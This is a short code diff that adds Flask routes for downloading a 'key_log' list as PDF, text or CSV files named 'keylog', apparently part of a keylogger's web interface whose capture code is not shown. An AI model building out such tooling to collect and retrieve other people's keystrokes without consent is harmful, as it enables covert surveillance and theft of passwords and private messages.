@@ -1,0 +1,27 @@
+@app.route('/download_log')
+def download_log():
+    pdf = FPDF()
+    pdf.add_page()
+    pdf.set_font("Arial", size=12)
+    pdf.multi_cell(0, 10, ' '.join(key_log))
+    
+    response = make_response(pdf.output(dest='S').encode('latin1'))
+    response.headers.set('Content-Disposition', 'attachment', filename='keylog.pdf')
+    response.headers.set('Content-Type', 'application/pdf')
+    return response
+
+@app.route('/download_log_txt')
+def download_log_txt():
+    log_text = ' '.join(key_log)
+    response = make_response(log_text)
+    response.headers.set('Content-Disposition', 'attachment', filename='keylog.txt')
+    response.headers.set('Content-Type', 'text/plain')
+    return response
+
+@app.route('/download_log_csv')
+def download_log_csv():
+    log_text = ','.join(key_log)
+    response = make_response(log_text)
+    response.headers.set('Content-Disposition', 'attachment', filename='keylog.csv')
+    response.headers.set('Content-Type', 'text/csv')
+    return response
